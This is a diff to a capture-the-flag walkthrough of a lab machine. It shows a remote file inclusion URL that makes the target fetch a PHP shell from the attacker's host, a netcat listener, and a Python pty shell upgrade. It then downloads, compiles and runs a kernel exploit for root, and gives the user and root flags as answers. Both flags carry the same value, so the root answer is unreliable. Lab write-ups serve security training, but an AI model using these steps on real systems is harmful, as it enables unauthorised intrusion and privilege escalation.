@@ -155,7 +155,38 @@ nc -lvnp 8888<br />
 Third, we'll get the target to execute our remote shell<br />
 10.10.90.192/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.113.195:8000/shell.php<br />
 SCREENSHOT18<br />
-Success! We now have a shell. Let's verify which user we are by using whoami<br />
-whoami
+Success! We now have a shell, we can see from the output that we are user ID 33 www-data<br />
+Before trying to escalate our privileges let's have a look around on the current user to see if we can find the user flag. 
+On most CTF's I've found they are usually inside of the home folders. Let's go have a look.<br />
+SCREENSHOT19<br />
+Success! We found the user flag. Let's get to work and see if we can escalate our privileges.</p>
+Question 4:<br />
+***What is the user flag?*** 7ce5c2109a40f958099283600a9ae807
 
-</p>
+## Privilege Escalation
+
+<p>Since the shell we got isn't very stable, let's use Python to help that.<br />
+python -c 'import pty;pty.spawn("/bin/bash")'<br />
+SCREENSHOT20<br />
+Alright! Let's see what we can do about escalating our privileges, I'll start first by checking what kernel they are using.<br />
+uname -a<br />
+SCREENSHOT21<br />
+We can see the kernel version is 4.8.0-58-generic, let's have a look for exploits in that kernel version. 
+Good news! We can see on exploit-db with a little research that it is vulnerable - https://www.exploit-db.com/exploits/43418<br />
+Let's download the exploit on the target machine, we'll have to download it on our attacker machine first then serve it through 
+the python HTTP server we set up earlier.<br />
+Once you have downloaded the exploit and saved it in the same directory as your web server is running... Change your target machines directory to a place you have write permissions I used /tmp<br />
+wget http://10.10.113.195:8000/priv.c<br />
+chmod +x priv.c<br />
+gcc priv.c -o priv<br />
+./priv<br />
+SCREENSHOT22<br />
+SUCCESS! We have root, all we have to do now is find the root flag and we're done!<br />
+cd /root<br />
+cat root.txt<br />
+SCREENSHOT23<br /></p>
+Question 5:<br />
+***What is the root flag?*** 7ce5c2109a40f958099283600a9ae807<br />
+
+## Farewell, I hope you all enjoyed this write-up!
+
